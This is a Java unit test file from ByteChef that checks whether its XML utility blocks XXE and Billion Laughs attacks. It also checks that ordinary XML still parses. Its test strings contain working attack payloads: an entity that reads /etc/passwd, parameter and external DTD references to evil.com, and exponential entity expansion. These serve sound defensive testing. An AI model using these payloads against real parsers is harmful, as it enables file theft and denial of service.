/*
 * Copyright 2025 ByteChef
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.bytechef.commons.util;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.List;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import tools.jackson.dataformat.xml.XmlMapper;

/**
 * @author Ivica Cardic
 */
class XmlUtilsTest {

    @BeforeAll
    static void setUp() {
        XmlUtils.setXmlMapper(new XmlMapper());
    }

    @Test
    void testXxeAttackWithExternalEntityIsBlocked() {
        // XXE attack payload attempting to read /etc/passwd
        String xxePayload = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
                <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <root>
                <data>&xxe;</data>
            </root>
            """;

        InputStream inputStream = new ByteArrayInputStream(xxePayload.getBytes(StandardCharsets.UTF_8));

        // Should throw exception because DOCTYPE is disallowed
        assertThatThrownBy(() -> XmlUtils.readList(inputStream, "/root/data"))
            .isInstanceOf(RuntimeException.class);
    }

    @Test
    void testXxeAttackWithParameterEntityIsBlocked() {
        // XXE attack with parameter entity
        String xxePayload = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
                <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
                %xxe;
            ]>
            <root>
                <data>test</data>
            </root>
            """;

        InputStream inputStream = new ByteArrayInputStream(xxePayload.getBytes(StandardCharsets.UTF_8));

        assertThatThrownBy(() -> XmlUtils.readList(inputStream, "/root/data"))
            .isInstanceOf(RuntimeException.class);
    }

    @Test
    void testBillionLaughsAttackIsBlocked() {
        // Billion Laughs (exponential entity expansion) attack
        String billionLaughs = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE lolz [
                <!ENTITY lol "lol">
                <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
                <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
                <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
            ]>
            <lolz>&lol4;</lolz>
            """;

        InputStream inputStream = new ByteArrayInputStream(billionLaughs.getBytes(StandardCharsets.UTF_8));

        assertThatThrownBy(() -> XmlUtils.readList(inputStream, "/lolz"))
            .isInstanceOf(RuntimeException.class);
    }

    @Test
    void testXxeWithExternalDtdIsBlocked() {
        // External DTD reference
        String xxePayload = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root SYSTEM "http://evil.com/malicious.dtd">
            <root>
                <data>test</data>
            </root>
            """;

        InputStream inputStream = new ByteArrayInputStream(xxePayload.getBytes(StandardCharsets.UTF_8));

        assertThatThrownBy(() -> XmlUtils.readList(inputStream, "/root/data"))
            .isInstanceOf(RuntimeException.class);
    }

    @Test
    void testValidXmlWithoutDoctypeWorks() {
        // Valid XML without DOCTYPE should work
        String validXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <root>
                <item>value1</item>
                <item>value2</item>
            </root>
            """;

        InputStream inputStream = new ByteArrayInputStream(validXml.getBytes(StandardCharsets.UTF_8));
        List<?> result = XmlUtils.readList(inputStream, "/root/item");

        assertThat(result).isNotNull();
        assertThat(result).hasSize(2);
    }

    @Test
    void testSimpleXmlRead() {
        String simpleXml = "<root><name>test</name><value>123</value></root>";

        var result = XmlUtils.read(simpleXml);

        assertThat(result).isNotNull();
        assertThat(result).containsKey("name");
        assertThat(result.get("name")).isEqualTo("test");
    }

    @Test
    void testXmlWithProcessingInstructionWorks() {
        String xmlWithPi = """
            <?xml version="1.0" encoding="UTF-8"?>
            <root>
                <data>test value</data>
            </root>
            """;

        InputStream inputStream = new ByteArrayInputStream(xmlWithPi.getBytes(StandardCharsets.UTF_8));
        List<?> result = XmlUtils.readList(inputStream, "/root/data");

        assertThat(result).isNotNull();
    }
}
